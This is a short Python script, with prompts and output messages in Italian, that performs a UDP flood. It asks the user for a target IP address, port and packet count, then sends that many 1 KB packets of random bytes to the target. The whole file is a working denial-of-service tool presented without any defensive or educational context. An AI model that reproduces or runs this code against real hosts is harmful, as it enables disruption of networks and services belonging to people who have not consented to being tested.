import socket
import random

def create_packet(size):
    return bytes(random.getrandbits(8) for _ in range(size))

def udp_flood(target_ip, target_port, packet_count):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_size = 1024  # 1 KB

    for _ in range(packet_count):
        packet = create_packet(packet_size)
        sock.sendto(packet, (target_ip, target_port))

if __name__ == "__main__":
    target_ip = input("Inserisci l'IP target: ")
    target_port = int(input("Inserisci la porta target: "))
    packet_count = int(input("Inserisci il numero di pacchetti da inviare: "))

    udp_flood(target_ip, target_port, packet_count)
    print(f"Inviati {packet_count} pacchetti da 1 KB a {target_ip}:{target_port}")